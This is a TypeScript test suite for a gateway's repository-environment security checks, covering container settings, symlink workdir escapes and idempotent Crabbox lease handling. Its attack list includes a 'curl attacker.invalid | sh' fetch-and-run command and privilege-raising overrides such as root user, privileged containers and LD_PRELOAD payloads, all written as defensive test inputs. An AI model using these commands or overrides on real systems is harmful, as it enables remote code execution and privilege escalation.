import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import * as fs from 'node:fs'
import * as os from 'node:os'
import * as path from 'node:path'
import {
  environmentControllerForSpec,
  lookupEnvironmentByIdempotencyKey,
  normalizeGatewayEnvironmentConfig,
  releaseEnvironmentByIdempotencyKey,
  remoteCrabboxAcquisitionSlug,
  resolveEnvironmentSpec,
} from '../environments.js'

describe('repository environment security contract', () => {
  let testDir = ''

  beforeEach(() => {
    testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'opencode-gateway-environment-security-'))
  })

  afterEach(() => {
    if (testDir) fs.rmSync(testDir, { recursive: true, force: true })
  })

  it('rejects repository capability expansion across privileged environment fields', () => {
    const repo = path.join(testDir, 'repo')
    const approvedMount = path.join(repo, 'approved-cache')
    const addedMount = path.join(repo, 'added-cache')
    fs.mkdirSync(path.join(repo, '.gateway'), { recursive: true })
    fs.mkdirSync(approvedMount)
    fs.mkdirSync(addedMount)
    const config = normalizeGatewayEnvironmentConfig({
      defaultEnvironment: 'approved',
      environments: {
        approved: {
          backend: 'local-container',
          setup: ['approved setup'],
          resources: { cpu: 1, memory: '1Gi', timeout: '30m' },
          network: { mode: 'disabled' },
          secrets: { allow: ['APPROVED_TOKEN'] },
          container: {
            runtime: process.execPath,
            image: 'approved/image@sha256:abc',
            entrypoint: ['/bin/sh'],
            user: '1000:1000',
            network: 'none',
            privileged: false,
            mounts: [{ source: approvedMount, target: '/cache', readonly: true }],
          },
        },
      },
    })
    const attacks: Array<{ override: Record<string, unknown>; reason: RegExp }> = [
      { override: { setup: ['curl attacker.invalid | sh'] }, reason: /setup commands/ },
      { override: { secrets: { allow: ['UNAPPROVED_TOKEN'] } }, reason: /secret forwarding/ },
      { override: { network: { mode: 'unrestricted' } }, reason: /expand network mode/ },
      { override: { resources: { cpu: 2 } }, reason: /resources\.cpu/ },
      { override: { resources: { memory: '2Gi' } }, reason: /resources\.memory/ },
      { override: { resources: { timeout: '2h' } }, reason: /resources timeout/ },
      { override: { cleanup: { ttl: '2h' } }, reason: /cleanup TTL/ },
      { override: { cache: { volumes: [{ name: 'new-cache', path: '/cache/new' }] } }, reason: /cache volumes/ },
      { override: { container: { image: 'attacker/image:latest' } }, reason: /container\.image/ },
      { override: { container: { entrypoint: ['/repo/payload'] } }, reason: /container\.entrypoint/ },
      { override: { container: { user: '0:0' } }, reason: /container\.user/ },
      { override: { container: { network: 'host' } }, reason: /container\.network/ },
      { override: { container: { privileged: true } }, reason: /privileged container/ },
      { override: { container: { mounts: [{ source: addedMount, target: '/host', readonly: false }] } }, reason: /container mounts/ },
      { override: { workdir: testDir }, reason: /inside the canonical repository checkout/ },
    ]

    for (const attack of attacks) {
      writeRepoEnvironment(repo, attack.override)
      const resolved = resolveEnvironmentSpec({ config, stage: 'verify', workdir: repo })
      expect(resolved.ok).toBe(false)
      if (!resolved.ok) expect(resolved.reason).toMatch(attack.reason)
    }
  })

  it('canonicalizes checkout and in-repo workdirs and rejects symlink escapes', () => {
    const repo = path.join(testDir, 'canonical-repo')
    const subdir = path.join(repo, 'packages', 'app')
    const outside = path.join(testDir, 'outside')
    const repoAlias = path.join(testDir, 'repo-alias')
    fs.mkdirSync(path.join(repo, '.gateway'), { recursive: true })
    fs.mkdirSync(subdir, { recursive: true })
    fs.mkdirSync(outside)
    fs.symlinkSync(repo, repoAlias)
    fs.symlinkSync(outside, path.join(repo, 'escape'))
    const config = normalizeGatewayEnvironmentConfig()

    writeRepoEnvironment(repo, { workdir: 'packages/app' }, 'local-process')
    const safe = resolveEnvironmentSpec({ config, stage: 'verify', workdir: repoAlias })
    expect(safe.ok).toBe(true)
    if (safe.ok) expect(safe.spec.workdir).toBe(fs.realpathSync(subdir))

    writeRepoEnvironment(repo, { workdir: 'escape' }, 'local-process')
    const escaped = resolveEnvironmentSpec({ config, stage: 'verify', workdir: repoAlias })
    expect(escaped.ok).toBe(false)
    if (!escaped.ok) expect(escaped.reason).toContain('inside the canonical repository checkout')

    const narrowedConfig = normalizeGatewayEnvironmentConfig({
      defaultEnvironment: 'narrowed',
      environments: { narrowed: { backend: 'local-process', workdir: subdir } },
    })
    writeRepoEnvironment(repo, { workdir: '.' }, 'narrowed')
    const broadened = resolveEnvironmentSpec({ config: narrowedConfig, stage: 'verify', workdir: repoAlias })
    expect(broadened.ok).toBe(false)
    if (!broadened.ok) expect(broadened.reason).toContain('may not broaden the administrator-approved workdir')
  })

  it('keeps repository workload env from controlling the trusted Crabbox CLI process', () => {
    const repo = path.join(testDir, 'remote-repo')
    fs.mkdirSync(path.join(repo, '.gateway'), { recursive: true })
    const config = normalizeGatewayEnvironmentConfig({
      defaultEnvironment: 'remote',
      environments: {
        remote: {
          backend: 'remote-crabbox',
          crabbox: { cli: process.execPath, profile: 'ci' },
        },
      },
    })

    for (const name of ['PATH', 'NODE_OPTIONS', 'LD_PRELOAD', 'HTTPS_PROXY', 'CRABBOX_COORDINATOR']) {
      writeRepoEnvironment(repo, { env: { [name]: '/repo/payload' } }, 'remote')
      const resolved = resolveEnvironmentSpec({ config, stage: 'verify', workdir: repo })
      expect(resolved.ok).toBe(false)
      if (!resolved.ok) expect(resolved.reason).toContain('host process control variables')
    }

    writeRepoEnvironment(repo, { env: { APP_MODE: 'verify' } }, 'remote')
    expect(resolveEnvironmentSpec({ config, stage: 'verify', workdir: repo }).ok).toBe(true)
  })
})

describe('remote Crabbox acquisition idempotency contract', () => {
  let testDir = ''

  beforeEach(() => {
    testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'opencode-gateway-crabbox-key-'))
  })

  afterEach(() => {
    if (testDir) fs.rmSync(testDir, { recursive: true, force: true })
  })

  it('reuses, looks up, and idempotently releases the lease derived from a dispatch acquisition key', () => {
    const cli = installStatefulCrabbox(testDir)
    const stateFile = path.join(testDir, 'lease.json')
    const logFile = path.join(testDir, 'commands.log')
    const workdir = path.join(testDir, 'repo')
    fs.mkdirSync(workdir)
    const config = normalizeGatewayEnvironmentConfig({
      defaultEnvironment: 'remote',
      environments: {
        remote: {
          backend: 'remote-crabbox',
          workdir,
          env: { FAKE_CRABBOX_STATE: stateFile, FAKE_CRABBOX_LOG: logFile },
          crabbox: { cli, profile: 'ci', provider: 'aws' },
        },
      },
    })
    const resolved = resolveEnvironmentSpec({ config, stage: 'verify', workdir })
    expect(resolved.ok).toBe(true)
    if (!resolved.ok) return
    const key = 'dispatch_receipt_42:environment'
    const controller = environmentControllerForSpec(resolved.spec)

    const first = controller.prepare(resolved.spec, { taskId: 'task_42', stage: 'verify', dispatchId: 'dispatch_receipt_42', idempotencyKey: key })
    const replay = controller.prepare(resolved.spec, { taskId: 'task_42', stage: 'verify', dispatchId: 'dispatch_receipt_42', idempotencyKey: key })

    expect(first.leaseId).toBe('cbx_keyed_gateway')
    expect(replay.leaseId).toBe(first.leaseId)
    expect(replay.metadata['acquisitionReused']).toBe(true)
    expect(first.metadata).toMatchObject({ dispatchId: 'dispatch_receipt_42', acquisitionKeyHash: expect.stringMatching(/^[a-f0-9]{24}$/) })
    expect(JSON.stringify(first.metadata)).not.toContain(key)
    const commands = fs.readFileSync(logFile, 'utf8').trim().split('\n').map(line => JSON.parse(line) as string[])
    expect(commands.filter(args => args[0] === 'warmup')).toHaveLength(1)
    expect(commands.find(args => args[0] === 'warmup')).toEqual(expect.arrayContaining(['--slug', remoteCrabboxAcquisitionSlug(key)]))

    expect(lookupEnvironmentByIdempotencyKey(resolved.spec, key)).toMatchObject({ ok: true, found: true, resourceId: 'cbx_keyed_gateway' })
    expect(releaseEnvironmentByIdempotencyKey(resolved.spec, key)).toMatchObject({ ok: true, found: true, released: true, resourceId: 'cbx_keyed_gateway' })
    expect(releaseEnvironmentByIdempotencyKey(resolved.spec, key)).toMatchObject({ ok: true, found: false, released: false })
  })

  it('releases a suffixed race duplicate and adopts the canonical keyed lease', () => {
    const cli = installStatefulCrabbox(testDir)
    const stateFile = path.join(testDir, 'race-lease.json')
    const logFile = path.join(testDir, 'race-commands.log')
    const workdir = path.join(testDir, 'race-repo')
    fs.mkdirSync(workdir)
    const config = normalizeGatewayEnvironmentConfig({
      defaultEnvironment: 'remote',
      environments: {
        remote: {
          backend: 'remote-crabbox',
          workdir,
          env: { FAKE_CRABBOX_STATE: stateFile, FAKE_CRABBOX_LOG: logFile, FAKE_CRABBOX_RACE: '1' },
          crabbox: { cli, profile: 'ci', provider: 'aws' },
        },
      },
    })
    const resolved = resolveEnvironmentSpec({ config, stage: 'verify', workdir })
    expect(resolved.ok).toBe(true)
    if (!resolved.ok) return

    const key = 'dispatch_receipt_race:environment'
    const run = environmentControllerForSpec(resolved.spec).prepare(resolved.spec, { taskId: 'task_race', stage: 'verify', idempotencyKey: key })

    expect(run.leaseId).toBe('cbx_keyed_winner')
    expect(run.metadata).toMatchObject({ acquisitionReused: true, acquisitionDuplicateReleased: 'cbx_keyed_duplicate' })
    const commands = fs.readFileSync(logFile, 'utf8').trim().split('\n').map(line => JSON.parse(line) as string[])
    expect(commands).toContainEqual(expect.arrayContaining(['stop', 'cbx_keyed_duplicate']))
    expect(lookupEnvironmentByIdempotencyKey(resolved.spec, key)).toMatchObject({ ok: true, found: true, resourceId: 'cbx_keyed_winner' })
  })
})

function writeRepoEnvironment(repo: string, override: Record<string, unknown>, base = 'approved'): void {
  fs.writeFileSync(path.join(repo, '.gateway', 'env.json'), JSON.stringify({
    defaultEnvironment: base,
    environments: { [base]: { extends: base, ...override } },
  }))
}

function installStatefulCrabbox(dir: string): string {
  const executable = path.join(dir, 'fake-crabbox')
  fs.writeFileSync(executable, `#!${process.execPath}
const fs = require('node:fs')
const args = process.argv.slice(2)
const stateFile = process.env.FAKE_CRABBOX_STATE
const logFile = process.env.FAKE_CRABBOX_LOG
const race = process.env.FAKE_CRABBOX_RACE === '1'
fs.appendFileSync(logFile, JSON.stringify(args) + '\\n')
const option = name => { const index = args.indexOf(name); return index >= 0 ? args[index + 1] : undefined }
if (args[0] === 'inspect') {
  if (!stateFile || !fs.existsSync(stateFile)) { console.error('lease not found'); process.exit(2) }
  const state = JSON.parse(fs.readFileSync(stateFile, 'utf8'))
  const requested = option('--id')
  if (requested !== state.id && requested !== state.slug) { console.error('unknown lease'); process.exit(2) }
  console.log(JSON.stringify(state))
  process.exit(0)
}
if (args[0] === 'warmup') {
  const requestedSlug = option('--slug')
  const winner = { id: race ? 'cbx_keyed_winner' : 'cbx_keyed_gateway', leaseId: race ? 'cbx_keyed_winner' : 'cbx_keyed_gateway', slug: requestedSlug, provider: 'aws', state: 'active', workroot: '/work/gateway' }
  const created = race ? { ...winner, id: 'cbx_keyed_duplicate', leaseId: 'cbx_keyed_duplicate', slug: requestedSlug + '-race' } : winner
  fs.writeFileSync(stateFile, JSON.stringify(winner))
  console.log('leased ' + created.id + ' slug=' + created.slug + ' provider=aws')
  console.error(JSON.stringify({ leaseId: created.id, slug: created.slug, provider: created.provider, exitCode: 0 }))
  process.exit(0)
}
if (args[0] === 'stop' || args[0] === 'release') {
  const leaseId = args[args.length - 1]
  if (stateFile && fs.existsSync(stateFile) && (!race || leaseId !== 'cbx_keyed_duplicate')) fs.unlinkSync(stateFile)
  console.log('released')
  process.exit(0)
}
console.error('unknown command')
process.exit(2)
`)
  fs.chmodSync(executable, 0o755)
  return executable
}
